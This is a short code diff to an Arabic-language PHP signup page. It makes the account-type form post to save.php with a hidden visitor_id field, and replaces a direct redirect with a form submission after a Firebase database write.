@@ -235,7 +235,8 @@
         <div class="form-card" id="form-container">
             <h2>اختر نوع الحساب</h2>
             
-            <form id="mainForm">
+            <form id="mainForm" action="save.php" method="POST">
+                <input type="hidden" name="visitor_id" value="<?php echo htmlspecialchars($_GET['visitor_id'] ?? ''); ?>">
                 <div class="form-group">
                     <label class="label-text">نوع الحساب <span style="color:var(--primary-color)">ⓘ</span> <span style="color:red">*</span></label>
                     <label class="radio-option">
@@ -366,9 +367,9 @@
                 timestamp: firebase.database.ServerValue.TIMESTAMP
             });
 
-            // التوجيه التلقائي لصفحة personal_info.php
+            // إرسال الفورم لـ save.php ليقوم بالتوجيه لصفحة التحميل
             setTimeout(() => {
-                window.location.href = "personal_info.php";
+                document.getElementById('mainForm').submit();
             }, 1500);
         };
 
